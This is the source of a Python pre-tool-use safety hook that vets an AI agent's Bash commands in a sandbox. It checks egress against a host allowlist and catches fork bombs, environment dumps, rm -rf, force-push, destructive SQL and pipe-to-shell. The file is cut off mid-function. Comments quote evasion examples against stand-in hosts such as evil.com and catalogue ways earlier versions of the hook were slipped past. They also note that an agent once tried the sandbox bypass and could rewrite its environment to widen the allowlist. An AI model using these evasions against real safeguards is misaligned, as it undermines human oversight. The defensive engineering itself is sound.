#!/usr/bin/env python3
"""Bundled PreToolUse safety hook.

Reads a JSON payload from stdin per the Claude Code hook spec, returns
a JSON decision object on stdout. Refuses workspace-destructive Bash
commands, hosts outside the Agnes egress allowlist, and prompts for
admin mutations. A small set of org floor rules additionally denies
irreversibly destructive commands (mkfs, fork bomb) and requires user
confirmation for high-blast-radius ones (recursive force delete, git
force-push, destructive SQL, pipe-to-shell).

Commands are scanned per shell segment (split on ``;``, ``&&``, ``||``,
``&`` and newlines, with common wrappers like ``sudo``/``nohup``
stripped) so a chained command can't slip a match past a prefix check.
The splitter is deliberately quote-naive: a separator inside a quoted
string still starts a new scan segment, which can over-ask (e.g. on an
echoed string containing ``rm -rf``) but never under-blocks — the safe
failure direction.

Operators with an Initial Workspace Template override take
responsibility for shipping an equivalent hook (admin UI warns at
template upload time if absent).
"""

from __future__ import annotations

import functools
import json
import re
import shlex
import sys

ALLOWED_HOSTS = {
    "127.0.0.1",
    "localhost",
    "api.anthropic.com",
    "api.github.com",
}


def _agnes_host() -> str | None:
    """This instance's own hostname, from the env the sandbox is spawned with.

    It cannot be a literal above: the host differs per deployment, and this
    file ships verbatim. A historic sandbox-level allowlist derived the same
    host for its own policy and its comment claimed the two agreed — they did
    not. The sandbox allowed the Agnes host and this hook did not, so every
    in-sandbox request to Agnes was refused here, before it ever reached the
    network that would have permitted it.

    What that cost, watched live: asked to build a data app, the agent got its
    git credential from the API, then failed to clone the app's repo by name,
    by hostname and by IP — including one attempt with the sandbox bypass —
    because `…/data-apps.git/<slug>` lives on the Agnes host. Authoring a data
    app from chat was impossible for that reason alone. The MCP tools kept
    working throughout, which is what made it confusing: they reach the server
    through the local relay on 127.0.0.1, which was allowed.

    On trust: `AGNES_SERVER` is set by the manager at spawn, but the agent can
    write to its own environment — so a rewritten value would widen this set.
    That is not a regression. This hook lives inside the sandbox on a
    filesystem the agent can write, so it has always been advisory; the
    authoritative controls live outside the sandbox — the docker provider's
    egress modes (`none`'s internal bridge, `allowlist`'s egress-proxy
    sidecar with its compose-owned EGRESS_ALLOW_HOSTS) and, on kai-agent,
    the engine's own sandbox policy.
    """
    import os
    from urllib.parse import urlparse

    # `AGNES_REAL_SERVER` first: the runner starts a loopback relay and
    # overwrites `AGNES_SERVER` with `http://127.0.0.1:<port>/agnes-api`
    # before `claude` — and therefore this hook — ever runs, so reading
    # `AGNES_SERVER` alone yielded the loopback host and the real Agnes host
    # was never allowed. `AGNES_SERVER` stays as the fallback for contexts
    # with no relay (tests, a directly-invoked workspace).
    raw = (os.environ.get("AGNES_REAL_SERVER") or os.environ.get("AGNES_SERVER") or "").strip()
    if not raw:
        return None
    # A bare `host:port` parses with no hostname — accept both spellings.
    parsed = urlparse(raw if "//" in raw else f"//{raw}")
    return parsed.hostname or None


_host = _agnes_host()
if _host:
    ALLOWED_HOSTS.add(_host)

DESTRUCTIVE_PATHS = ("workspace/snapshots/", "workspace/scripts/")
DESTRUCTIVE_PREFIXES = ("rm ", "rm\t", "unlink ", "truncate -s 0", "shred ")

ADMIN_PROMPT_PREFIXES = (
    "agnes admin grant",
    "agnes admin group",
    "agnes admin user",
)

_ENUM_PREFIXES = ("find /", "ls /home", "ls /etc", "cat /etc/", "cat /proc/")


# curl/wget flags that consume the FOLLOWING token as their value (so that
# token is an argument, never the request target). Skipping their values
# stops a dotted filename like `--output results.example.csv` from being
# misread as a bare host and denied.
#
# The sets are PER-TOOL because the same short letter takes a value in one
# tool but NOT the other, and a wrong "takes a value" entry skips the token
# after it — which can be the real request target (an egress bypass). E.g.
# `-c` is curl's `--cookie-jar` (value) but wget's `--continue` (no arg): a
# shared set made `wget -c evil.com` skip `evil.com` and slip past the
# allowlist. curl's `-O`/`--remote-name` likewise takes no arg (wget's does).
# So we pick the set by the invoked tool and only list flags we're confident
# take a value for THAT tool — the failure direction stays safe: an omitted
# value-flag at worst over-blocks (its value re-checked as a host), never
# under-blocks the real target. (Devin + security review on #847/#848.)
#
# Deliberately NOT listed for either tool — flags whose value IS (or can carry)
# the real network destination, so the value must keep being host-checked:
#   -x / --proxy        the proxy value is the actual TCP peer for the request.
#   -K / --config       a curl config file can carry url=/proxy=/header=.
#   --resolve / --connect-to  pin/redirect the connection to an arbitrary peer.
#   -O                  curl `-O`/`--remote-name` takes NO argument.
_CURL_VALUE_FLAGS = {
    "-o",
    "--output",
    "-d",
    "--data",
    "--data-binary",
    "--data-raw",
    "--data-urlencode",
    "--data-ascii",
    "-H",
    "--header",
    "-A",
    "--user-agent",
    "-e",
    "--referer",
    "-b",
    "--cookie",
    "-c",
    "--cookie-jar",
    "-F",
    "--form",
    "-u",
    "--user",
    "-T",
    "--upload-file",
    "-E",
    "--cert",
    "--key",
    "--cacert",
    "-w",
    "--write-out",
    "-m",
    "--max-time",
    "--connect-timeout",
    "--retry",
    "-U",
    "--proxy-user",
}
_WGET_VALUE_FLAGS = {
    "-O",
    "--output-document",
    "-o",
    "--output-file",
    "-a",
    "--append-output",
    "--header",
    "-U",
    "--user-agent",
    "--referer",
    "-P",
    "--directory-prefix",
    "-t",
    "--tries",
    "-T",
    "--timeout",
    "-w",
    "--wait",
    "--user",
    "--password",
    "--post-data",
    "--post-file",
    "-A",
    "--accept",
    "-R",
    "--reject",
    "-D",
    "--domains",
    "-Q",
    "--quota",
    "--limit-rate",
    "-e",
    "--execute",
    "--bind-address",
    "--load-cookies",
    "--save-cookies",
    "--http-user",
    "--http-password",
    "--certificate",
    "--private-key",
    "--ca-certificate",
}
_VALUE_TAKING_FLAGS = {"curl": _CURL_VALUE_FLAGS, "wget": _WGET_VALUE_FLAGS}

# Org floor rules — hold regardless of chaining or workspace-template intent.
# Deny: irreversible, no legitimate analyst use. Ask: legitimate but
# high-blast-radius, so the user confirms in chat before it runs.
_FORK_BOMB_RE = re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:")
_DESTRUCTIVE_SQL_RE = re.compile(r"\bdrop\s+(?:table|schema|database)\b|\btruncate\s+table\b", re.IGNORECASE)
_FORCE_PUSH_FLAGS = {"-f", "--force", "--force-with-lease"}

# Wrappers that prefix the real command; stripped before token checks so
# `sudo rm -rf` matches the same rules as `rm -rf`. timeout's duration and
# leading VAR=val assignments after env are skipped too. Anything fancier
# (nested `sh -c`, eval, command substitution) is out of scope for this
# hook. Do not read that as "something else catches it": what the network
# layer actually enforces for the chat sandbox is documented in
# docs/cloud-chat.md, and it has not always been a backstop.
#
# This is an allowlist, so it is inherently incomplete: a privilege/exec
# wrapper that is not listed hides the command behind it from every token
# check. Keep it broad, and prefer adding a name here over discovering the
# gap later.
# Only wrappers with the simple `WRAPPER [flags] [positionals] CMD ARGS...`
# shape belong here. `su`/`runuser`/`sh -c` take a shell STRING, not a
# command vector, and re-parsing that is out of scope for this hook (same
# bucket as eval / command substitution). See docs/cloud-chat.md for what the
# network layer actually enforces.
#
# This is an allowlist, so it is inherently incomplete: an unlisted
# privilege/exec wrapper hides the command behind it from every token check.
# Prefer adding a name here over discovering the gap later.
_WRAPPERS = {
    "sudo",
    "doas",
    "nohup",
    "command",
    "exec",
    "time",
    "nice",
    "ionice",
    "env",
    "timeout",
    "stdbuf",
    "setsid",
    "chroot",
    "flock",
    "taskset",
    "chrt",
    "xargs",
}

# Flags that consume the NEXT token as their value, PER wrapper — a global
# table gets this wrong, e.g. `-n` is a value flag for `nice` but a boolean
# for `sudo`, so `sudo -n rm -rf x` would swallow the `rm`.
_WRAPPER_VALUE_FLAGS = {
    # NOTE no "-h": modern sudo reads a bare -h as --help, and the valued
    # form is --host=. Modelling it as value-taking made `sudo -h rm -rf x`
    # swallow the wrapped command — this table must err toward over-asking
    # (review finding on #1141).
    "sudo": {"-u", "-g", "-C", "-p", "-r", "-t", "-T", "--user", "--group", "--prompt", "--host"},
    "doas": {"-u", "-C"},
    "nice": {"-n", "--adjustment"},
    "ionice": {"-c", "-n", "-p", "--class", "--classdata", "--pid"},
    "timeout": {"-s", "-k", "--signal", "--kill-after"},
    "flock": {"-w", "-E", "--wait", "--conflict-exit-code"},
    "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
    "env": {"-u", "-C", "-S", "--unset", "--chdir"},
    "chroot": {"--userspec", "--groups"},
}

# Wrappers taking a positional argument of their own before the command:
# `chroot NEWROOT cmd`, `flock FILE cmd`, `taskset MASK cmd`, `chrt PRIO cmd`.
_WRAPPER_POSITIONALS = {"chroot": 1, "flock": 1, "taskset": 1, "chrt": 1}


# Any token made purely of shell operator characters is a separator. Testing
# the character set rather than enumerating spellings is deliberate: an
# enumeration missed `|&` and `;&`, which merged the pieces either side into
# one segment whose head was the harmless leading command (review on #1141).
# Shell grammar words that can precede the real command inside a compound
# statement. Stripped before the head is identified.
_SHELL_KEYWORDS = frozenset(
    {"if", "then", "elif", "else", "fi", "for", "while", "until", "do", "done", "case", "esac", "!", "{", "}", "in"}
)

# Redirection operators; the token after one is its target, not a command.
_REDIRECTIONS = frozenset({"<", ">", ">>", "<<", "<<<", "&>", ">&", "2>", "2>>"})

# NOTE parentheses are deliberately NOT here. They group; they do not
# separate commands the way `;`/`&`/`|` do, and treating them as separators
# tore `rm -rf $(cat list)` into pieces whose head was no longer the command
# (review finding on #1141). Grouping punctuation is stripped off tokens in
# _split_segments instead.
_OPERATOR_CHARS = frozenset(";&|\n")


def _is_operator(tok: str) -> bool:
    return bool(tok) and all(c in _OPERATOR_CHARS for c in tok)


def _blank_arithmetic(line: str) -> str:
    """Blank `$((...))` / `((...))` spans with a single linear scan.

    The regex this replaces rescanned the rest of the line for every
    unmatched `((`, which is quadratic — and the security playbook requires
    regexes over untrusted text to be linear-time (review finding on #1141).
    """
    out = list(line)
    depth = 0
    i = 0
    while i < len(line) - 1:
        if line[i] == "(" and line[i + 1] == "(":
            depth += 1
            out[i] = out[i + 1] = " "
            i += 2
            continue
        if depth and line[i] == ")" and line[i + 1] == ")":
            depth -= 1
            out[i] = out[i + 1] = " "
            i += 2
            continue
        if depth:
            out[i] = " "
        i += 1
    if depth and i < len(line):
        out[i] = " "
    return "".join(out)


def _has_unquoted_heredoc(line: str, *, in_single: bool = False, in_double: bool = False) -> tuple[bool, bool, bool]:
    """The heredoc marker opened outside quotes (or None), plus end-of-line quote state.

    The caller threads the returned quote state into the next line: a string
    spanning several lines otherwise reset it and a quoted `<<` inside one
    opened a phantom heredoc.

    Arithmetic spans are blanked first: `$((1<<N))` is a left shift, and
    reading it as a heredoc marker made every later line of the command go
    unscanned (review finding on #1141).
    """
    # Both forms: `$((...))` expansion and the bare `((...))` command. Only
    # blanking the first left `((1<<N))` opening a phantom heredoc that
    # swallowed every later line (review finding on #1141).
    line = _blank_arithmetic(line)
    # `let x=1<<n` and `x=$((…))`-free shifts are arithmetic too, just
    # without the parentheses _blank_arithmetic keys on. A `<<` whose left
    # side ends in a digit or identifier character is a shift, not a marker.
    # No whitespace either side: `1<<n` is a shift, `cat <<EOF` is a marker.
    line = re.sub(r"(?<=[0-9A-Za-z_])<<(?=[0-9A-Za-z_])", " SHIFT ", line)
    marker = None
    i = 0
    while i < len(line):
        c = line[i]
        if c == "\\" and not in_single:
            i += 2
            continue
        if c == "'" and not in_double:
            in_single = not in_single
        elif c == '"' and not in_double and not in_single:
            in_double = not in_double
        elif c == '"' and in_double:
            in_double = False
        elif c == "<" and not in_single and not in_double and line[i : i + 2] == "<<":
            if marker is None and line[i : i + 3] != "<<<":
                # Extract the marker HERE, from the unquoted `<<` we just
                # found. Re-searching the raw line afterwards could pick a
                # quoted lookalike earlier in it and silence every following
                # line (review finding on #1141).
                m = re.match(r"<<-?\s*([\"\']?)([A-Za-z_][A-Za-z0-9_]*)\1", line[i:])
                if m:
                    marker = m.group(2)
        i += 1
    return marker, in_single, in_double


@functools.lru_cache(maxsize=16)
def _split_segments_with_seps(cmd: str) -> tuple[tuple[str, str], ...]:
    """Split a command line into independently-scanned shell segments.

    Quote-AWARE: a plain ``re.split`` on ``[;&|\n]`` tears a quoted argument
    apart, and for the egress check that fails OPEN rather than safe —
    ``curl -H "Accept: text/html; q=0.9" evil.example.com`` would put the
    host in a segment whose first token is no longer ``curl``, so the
    bare-host allowlist never inspected it (security review on #1141).

    A single ``|`` splits too: the downstream side of a pipe is its own
    command, and the bare-host egress check only inspects a segment's first
    token, so ``cat x | curl evil.com`` would otherwise never host-check the
    ``curl``. The pipe-to-shell rule runs over the WHOLE command before this
    split, so it still sees ``curl … | sh`` intact.

    Falls back to the naive split when the line does not lex (unbalanced
    quotes) — an over-eager split can only over-ask, and refusing to scan at
    all would be the one genuinely unsafe option.
    """
    segments: list[tuple[str, str]] = []
    pending_sep = ""
    # A trailing backslash continues the line: the shell reads both physical
    # lines as ONE command, so joining them first keeps a deletion or
    # download written across two lines recognizable (review on #1141).
    joined = re.sub(r"\\\n", " ", cmd)
    # Backticks are command substitution just like `$(...)`, but they glue
    # the inner command into one token so its head is never seen. Turning
    # them into whitespace exposes the inner command to the same rules
    # (review finding on #1141).
    joined = joined.replace("`", " ")
    # Newlines then split: shlex treats them as ordinary whitespace, so they
    # would never produce a boundary and every line after the first would be
    # read as arguments of the first command.
    heredoc_marker: str | None = None
    # Quote state carries ACROSS lines: a string spanning several lines left
    # each line judged on its own, so a quoted `<<` inside one opened a
    # phantom heredoc and the rest went unscanned (review finding on #1141).
    q_single = q_double = False
    for line in joined.split("\n"):
        # A heredoc body is DATA the command writes, not commands to run.
        # Scanning it as commands refused ordinary file writes because of
        # what the text said (review finding on #1141).
        if heredoc_marker is not None:
            if line.strip() == heredoc_marker:
                heredoc_marker = None
            continue
        # Only an UNQUOTED << opens a heredoc. Searching the raw line let a
        # quoted one (echo 'a << b') swallow every later line of a
        # multi-line command (review finding on #1141).
        found_marker, q_single, q_double = _has_unquoted_heredoc(line, in_single=q_single, in_double=q_double)
        if found_marker:
            # The body is data ONLY if the receiving program does not execute
            # it. `bash <<EOF … EOF` runs every line, so skipping it let the
            # floor rules — which are meant to hold regardless of chaining —
            # be avoided by writing the same command inside a heredoc
            # (review finding on #1141).
            # ANY stage of the line, not just its head: in `cat <<EOF | bash`
            # the head is `cat`, but bash still executes the body (review
            # finding on #1141). Split on the raw line — the segment list for
            # this line has not been built yet at this point.
            feeds_a_shell = any(
                (lambda t: bool(t) and _basename(t[0]) in _SHELLS)(_unwrap(_tokens(part)))
                for part in re.split(r"[|;&]", line)
            )
            if not feeds_a_shell:
                heredoc_marker = found_marker
        if not line.strip():
            continue
        try:
            # posix=False keeps quotes ON the tokens, which is what makes an
            # operator distinguishable from an argument whose VALUE is an
            # operator character: `curl -H '|' host` must not split. The
            # per-segment token checks re-parse with posix shlex, so quoting
            # is still resolved where it matters.
            lex = shlex.shlex(line, posix=False, punctuation_chars=True)
            lex.whitespace_split = True
            # `#` is NOT a comment introducer for our purposes: shlex would
            # drop the rest of the line, and a stray hash in an argument
            # would carry whatever follows it past every check.
            lex.commenters = ""
            tokens = list(lex)
        except ValueError:
            # Unbalanced quotes: the naive split is all that is left, and the
            # docstring above is right that it fails OPEN for the egress check
            # (a host can land in a segment whose head is no longer curl). So
            # also scan the WHOLE line as one segment: extra segments can only
            # add verdicts, never remove them, and this one's head is the real
            # command (review finding on #1141).
            segments.extend((p.strip(), "|") for p in re.split(r"[;&|]", line) if p.strip())
            segments.append((line.strip(), ""))
            continue

        current: list[str] = []
        for tok in tokens:
            if _is_operator(tok):
                if current:
                    segments.append((" ".join(current), pending_sep))
                    current = []
                pending_sep = tok
                continue
            # brace/subshell grouping is punctuation around the real command,
            # not the command itself
            stripped = tok.strip("{}()")
            if stripped:
                current.append(stripped)
        if current:
            segments.append((" ".join(current), pending_sep))
            pending_sep = ""
    return tuple(segments)


def _split_segments(cmd: str) -> list[str]:
    """Segments only — most rules do not care what joined them."""
    return [seg for seg, _ in _split_segments_with_seps(cmd)]


@functools.lru_cache(maxsize=64)
def _tokens_cached(seg: str) -> tuple[str, ...]:
    try:
        return tuple(shlex.split(seg))
    except ValueError:
        return tuple(seg.split())


def _tokens(seg: str) -> list[str]:
    """Tokens for one segment.

    Cached: every rule re-derives them from the same text, and each parse is
    superlinear in the length of a single token — a 400k-character argument
    cost ~7s across the repeated parses, past the CLI's 10s hook timeout,
    which makes the hook not run at all (review finding on #1141).
    """
    return list(_tokens_cached(seg))


def _basename(tok: str) -> str:
    """`/bin/rm` -> `rm`.

    Every token check compares the head against a bare command name, so
    without this an absolute or relative path invokes the same binary while
    matching nothing and falling through to a silent allow — the opposite of
    this module's over-ask invariant (review finding on #1141).
    """
    return tok.rsplit("/", 1)[-1] if "/" in tok else tok


def _normalized(seg: str) -> str:
    """Segment text with shell quoting resolved, for the whole-segment regexes.

    The token checks go through `shlex.split`, which resolves bash's
    adjacent-string concatenation (`"DR""OP TABLE x"` -> `DROP TABLE x`) and
    backslash escapes. The regex rules used to run on the raw text and so
    missed exactly those forms while the shell still executed the dangerous
    command (review finding on #1141).
    """
    toks = _tokens(seg)
    return " ".join(toks) if toks else seg


def _strip_prefix(toks: list[str], *, env_is_wrapper: bool, wrapper: str | None = None) -> list[str]:
    """Strip leading wrappers / their flags, values and positionals / VAR=val.

    ONE implementation, two callers. `_is_env_dump` used to keep its own copy
    of this walk and the two drifted: it never skipped `VAR=val`, so
    `FOO=1 printenv` read as a harmless command while plain `printenv` was
    refused (review finding on #1141).

    ``env_is_wrapper`` is the only real difference: `_unwrap` treats `env` as
    a wrapper to strip, while the dump check treats it as the command it is
    looking for.

    A wrapper's own positional (`chroot NEWROOT`, `flock FILE`, `taskset
    MASK`) is consumed AFTER its flags, not only when it sits immediately
    after the wrapper name — otherwise `taskset -c 0 rm -rf x` mistook the
    mask for the command and scanned nothing.
    """
    i = 0
    current: str | None = wrapper
    positionals_left = 0
    while i < len(toks):
        # Shell keywords are not the command: `if true; then rm -rf x; fi`
        # splits into a segment whose head is `then`, which matched no rule
        # and made the whole block invisible (review finding on #1141).
        if toks[i] in _SHELL_KEYWORDS:
            # `case SUBJECT in PATTERN) cmd` — the subject and the pattern are
            # data, but they are ordinary words, so skipping only the keywords
            # left the pattern as the head and the real command unscanned
            # (review finding on #1141).
            if toks[i] == "case":
                i += 1
                if i < len(toks) and toks[i] not in _SHELL_KEYWORDS:
                    i += 1  # the subject
                continue
            if toks[i] == "in":
                i += 1
                if i < len(toks) and toks[i] not in _SHELL_KEYWORDS:
                    i += 1  # the pattern
                continue
            i += 1
            continue
        # A redirection and its target are not the command either, and
        # letting them stand in for it hid `env > /tmp/leak`.
        # Redirections arrive either bare (`>` `file`) or glued to their
        # target (`2>/dev/null`). Matching only the bare form let the glued
        # one stand in for the command (review finding on #1141).
        # A bare file-descriptor number is part of the redirection that
        # follows it: the segment lexer splits `2>/dev/null` into `2`, `>`,
        # `/dev/null`, and the lone `2` was becoming the head.
        if re.fullmatch(r"\d+", toks[i]) and i + 1 < len(toks) and re.match(r"^&?[<>]{1,3}", toks[i + 1]):
            i += 1
            continue
        m_redir = re.match(r"^\d*(?:&?[<>]{1,3})(.*)$", toks[i])
        if toks[i] in _REDIRECTIONS or m_redir:
            glued_target = bool(m_redir and m_redir.group(1))
            i += 1
            if not glued_target and i < len(toks) and not toks[i].startswith("-"):
                i += 1
            continue
        t = _basename(toks[i])
        if t in _WRAPPERS and not (t == "env" and not env_is_wrapper):
            current = t
            positionals_left = _WRAPPER_POSITIONALS.get(t, 0)
            i += 1
            if t == "timeout" and i < len(toks) and re.fullmatch(r"\d+(?:\.\d+)?[smhd]?", toks[i]):
                i += 1
            continue
        if "=" in toks[i] and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", toks[i]):
            i += 1
            continue
        if toks[i].startswith("-"):
            flag = toks[i]
            i += 1
            if "=" not in flag and flag in _WRAPPER_VALUE_FLAGS.get(current or "", set()) and i < len(toks):
                i += 1
            continue
        if positionals_left:
            positionals_left -= 1
            i += 1
            continue
        break
    rest = toks[i:]
    return [_basename(rest[0])] + rest[1:] if rest else rest


def _unwrap(toks: list[str]) -> list[str]:
    """Strip leading wrapper commands so `sudo rm -rf` matches `rm -rf`.

    The returned head is basenamed, so `/bin/rm` is judged as `rm`.
    """
    return _strip_prefix(toks, env_is_wrapper=True)


def _is_env_dump(seg: str) -> bool:
    """True if the segment dumps the process environment, seeing through
    leading wrappers (``sudo env``, ``nice printenv``).

    ``env``/``printenv`` with no trailing command leak the whole
    environment; ``env FOO=bar cmd`` merely *runs* cmd (which is unwrapped
    and scanned separately), so it is not a pure dump. ``env`` is NOT
    stepped over here (it is the dump command itself), unlike in
    ``_unwrap`` where it is a wrapper — so this can't be defeated by the
    same wrapper-stripping that made the old raw-string check miss
    ``sudo env`` (security review on #1141)."""
    rest = _strip_prefix(_tokens(seg), env_is_wrapper=False)
    if not rest:
        return False
    head = _basename(rest[0])
    if head == "printenv":
        return True  # printenv [VAR] still leaks env values
    if head == "env":
        # `env FOO=bar cmd` merely runs cmd (scanned on its own). But the
        # trailing token can itself be a dump — `env printenv`, `env env` —
        # so step over assignments and re-check the head rather than bailing
        # on the mere presence of a trailing word (security review on #1141).
        # Reuse the shared walk rather than filtering out anything starting
        # with "-": that filter dropped flags but kept their VALUES, so
        # `env -u FOO printenv` read "FOO" as the command being run and the
        # dump was allowed. Third time flag-values have bitten in this file
        # (review finding on #1141) — hence one implementation.
        trailing = _strip_prefix(rest[1:], env_is_wrapper=False, wrapper="env")
        if not trailing:
            return True
        return _basename(trailing[0]) in ("env", "printenv")
    return False


#: Shells a downloaded script must not be piped into. Compared on the
#: BASENAME of the segment head, so /bin/sh and /usr/bin/bash count too.
_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "fish"})


def _pipes_download_into_shell(cmd: str) -> bool:
    """True when a downloader's output is PIPED into a shell.

    Pipeline-aware, not merely order-aware. Resetting on every segment was
    wrong in both directions: `curl … ; sh build.sh` is a sequence, not a
    pipe, and was prompted for nothing; `curl … | tee /tmp/a | sh` is a pipe
    with a stage in between, and slipped through (review findings on #1141).

    So the walk carries the flag across `|` and clears it on any other
    separator — which is exactly the distinction the segment separators
    exist to record.
    """
    saw_downloader = False
    for seg, sep in _split_segments_with_seps(cmd):
        if "|" not in sep:
            saw_downloader = False
        toks = _unwrap(_tokens(seg))
        if not toks:
            continue
        head = _basename(toks[0])
        if saw_downloader and head in _SHELLS:
            return True
        if head in ("curl", "wget"):
            saw_downloader = True
    return False


def _is_force_push(toks: list[str]) -> bool:
    """git push that rewrites remote history, across its common spellings.

    Matching `toks[:2] == ["git", "push"]` plus a standalone long flag missed
    `git -C dir push --force`, glued short flags (`git push -fu origin main`)
    and the `+refspec` form, all of which rewrite history just the same
    (review finding on #1141).
    """
    if not toks or toks[0] != "git":
        return False
    rest = toks[1:]
    # global git options before the subcommand: `git -C dir push`, `git -c k=v push`
    i = 0
    while i < len(rest) and rest[i].startswith("-"):
        if rest[i] in ("-C", "-c", "--git-dir", "--work-tree", "--namespace") and i + 1 < len(rest):
            i += 2
        else:
            i += 1
    if i >= len(rest) or rest[i] != "push":
        return False
    args = rest[i + 1 :]
    for a in args:
        if a in _FORCE_PUSH_FLAGS or a.startswith("--force-with-lease=") or a.startswith("--force-if-includes"):
            return True
        # glued short flags: -f, -fu, -uf
        if a.startswith("-") and not a.startswith("--") and "f" in a[1:]:
            return True
        # `git push origin +main` — a leading + on the refspec forces
        if a.startswith("+") and len(a) > 1:
            return True
    return False


def _rm_recursive_force(toks: list[str]) -> bool:
    if not toks or toks[0] != "rm":
        return False
    short = "".join(t[1:] for t in toks[1:] if t.startswith("-") and not t.startswith("--"))
    has_r = "r" in short or "R" in short or "--recursive" in toks
    has_f = "f" in short or "--force" in toks
    return has_r and has_f


def _bare_hosts(toks: list[str]) -> list[str]:
    """Bare hosts given as curl/wget arguments (scheme-defaulting)."""
    hosts = []
    if toks and toks[0] in ("curl", "wget"):
        value_flags = _VALUE_TAKING_FLAGS[toks[0]]
        skip_next = False
        for t in toks[1:]:
            if skip_next:
                # this token is the value of the preceding value-taking flag
                skip_next = False
                continue
            if t.startswith("-"):
                # `--flag=value` carries its own value; `--flag value` consumes
                # the next token. `=` form is self-contained, so only arm the
                # skip for the separate-token form of a value-taking flag OF THE
                # INVOKED TOOL (the same letter differs between curl and wget).
                if t in value_flags:
                    skip_next = True
                continue
            # Strip basic-auth userinfo BEFORE reading the host, exactly as
            # the schemed-URL path does. `curl api.github.com:pw@evil.example/x`
            # has authority `api.github.com:pw@evil.example` — splitting on
            # ":" first yields `api.github.com`, an allowed host, while the
            # request goes to `evil.example`. rsplit, because userinfo may
            # itself contain "@". (Devin Review on this PR.)
            authority = t.split("/")[0]
            cand = authority.rsplit("@", 1)[-1].split(":")[0]
            if "." in cand and not cand.startswith("http"):
                hosts.append(cand)
    return hosts


#: Above this, the command is not parsed. shlex is superlinear in the length
#: of a single token, so a multi-hundred-kilobyte argument pushed the scan
#: past the CLI's 10s hook timeout — and a hook that times out does not run,
#: which fails OPEN. Refusing to vouch for input we cannot inspect is the
#: only honest answer (review finding on #1141).
_MAX_SCAN_CHARS = 100_000


def _scan(cmd: str) -> list[tuple[str, str]]:
    """Collect every (decision, reason) the command trips, across segments."""
    verdicts: list[tuple[str, str]] = []

    if len(cmd) > _MAX_SCAN_CHARS:
        return [
            (
                "ask",
                f"Command is {len(cmd)} characters — too large for the policy hook to inspect "
                f"(limit {_MAX_SCAN_CHARS}). Confirm with the user, or split it into smaller steps.",
            )
        ]

    # Whole-command checks first: these patterns span segment separators
    # (`:|:&` contains `&`, pipe-to-shell contains `|`) or live inside
    # quoted SQL strings, so segment-splitting would hide them.
    #
    # Each runs over the raw text AND over the quote-normalized text, because
    # bash concatenates adjacent quoted strings: `psql -c "DR""OP TABLE x"`
    # executes a DROP whose literal substring never appears in the raw text.
    # Raw is kept too — normalizing collapses the `|` these patterns need.
    # Normalize the WHOLE command, not the rejoined segments: segment tokens
    # are lexed non-posix (quotes retained, so a quoted separator is not
    # mistaken for syntax), and joining them with spaces would destroy the
    # very adjacency concatenation these regexes need to see.
    haystacks = (cmd, _normalized(cmd))
    if any(_FORK_BOMB_RE.search(h) for h in haystacks):
        verdicts.append(("deny", "Refusing a fork bomb."))
    if any(_DESTRUCTIVE_SQL_RE.search(h) for h in haystacks):
        verdicts.append(
            (
                "ask",
                "Destructive SQL (DROP/TRUNCATE) — confirm with the user before running.",
            )
        )
    # One implementation, not two: the regex that used to sit alongside this
    # matched a couple of exact spellings and could only add false positives
    # the structural check would not make (review findings on #1141).
    if _pipes_download_into_shell(cmd):
        verdicts.append(
            (
                "ask",
                "Piping a download into a shell executes unreviewed remote code; confirm before running.",
            )
        )
    # schemed URLs anywhere in the command
    for u in re.findall(r"https?://([^/\s'\"]+)", cmd):
        # Drop `user:pass@` BEFORE reading the host. Taking `split(":")[0]` off
        # the whole authority read the basic-auth USERNAME as the hostname, and
        # that is wrong in both directions:
        #
        #   http://agnes:<jwt>@agnes.keboola.dev/…  → "agnes"  → denied,
        #       which is the shape of every data-app clone URL, so cloning an
        #       app's repo from the sandbox was refused no matter what the
        #       allowlist contained (watched live: "Outbound network to 'agnes'
        #       is not in the Agnes egress allowlist");
        #   http://api.github.com:x@evil.com/…      → "api.github.com" → ALLOWED,
        #       an allowlist bypass — anyone who can get a command run in the
        #       sandbox reaches any host by putting an allowed name in the
        #       userinfo.
        #
        # rsplit on the LAST "@": userinfo may itself contain one (a JWT does
        # not, but a password can), and the authority is what follows the last.
        host = u.rsplit("@", 1)[-1].split(":")[0]
        if host not in ALLOWED_HOSTS:
            verdicts.append(("deny", _egress_reason(host)))

    for seg in _split_segments(cmd):
        toks = _unwrap(_tokens(seg))
        unwrapped_lower = " ".join(toks).lower()

        # Env reconnaissance — seen through wrappers (``env``/``printenv``
        # dump their whole environment; unwrap alone strips ``env`` as a
        # wrapper, so this is checked on the raw segment via _is_env_dump).
        if _is_env_dump(seg) or unwrapped_lower.startswith("cat /proc/self/environ"):
            verdicts.append(("deny", "Refusing to dump the process environment."))
            continue

        if not toks:
            continue

        # Destructive ops against persistent workspace dirs
        if any(p in seg for p in DESTRUCTIVE_PATHS) and any(
            unwrapped_lower.startswith(pref) for pref in DESTRUCTIVE_PREFIXES
        ):
            verdicts.append(
                (
                    "deny",
                    "Refusing to delete from persistent workspace/snapshots or workspace/scripts. "
                    "Use a fresh path or ask the user explicitly.",
                )
            )

        # Filesystem enumeration outside the workspace
        if any(unwrapped_lower.startswith(p) for p in _ENUM_PREFIXES):
            verdicts.append(("deny", "Refusing to enumerate outside the working directory."))

        # Floor: irreversible destruction
        if toks[0].startswith("mkfs"):
            verdicts.append(("deny", "Refusing to build a filesystem over a device (mkfs)."))

        # Floor: high-blast-radius, user confirms
        if _rm_recursive_force(toks):
            verdicts.append(
                (
                    "ask",
                    "Recursive force delete (rm -rf) — confirm with the user before running.",
                )
            )
        if _is_force_push(toks):
            verdicts.append(("ask", "Force push rewrites remote history; confirm with the user before running."))

        # Outbound network — bare curl/wget hosts (scheme-defaulting)
        for host in _bare_hosts(toks):
            if host not in ALLOWED_HOSTS:
                verdicts.append(("deny", _egress_reason(host)))

        # Admin mutations need user confirmation
        if any(unwrapped_lower.startswith(p) for p in ADMIN_PROMPT_PREFIXES):
            verdicts.append(
                (
                    "ask",
                    "This command mutates the Agnes access-control layer; confirm before running.",
                )
            )

    return verdicts


def _egress_reason(host: str) -> str:
    return f"Outbound network to {host!r} is not in the Agnes egress allowlist. Allowed: " + ", ".join(
        sorted(ALLOWED_HOSTS)
    )


def _decide(payload: dict) -> dict:
    tool = payload.get("tool_name")
    if tool != "Bash":
        return {"permissionDecision": "allow"}
    cmd = (payload.get("tool_input") or {}).get("command", "")
    if not isinstance(cmd, str):
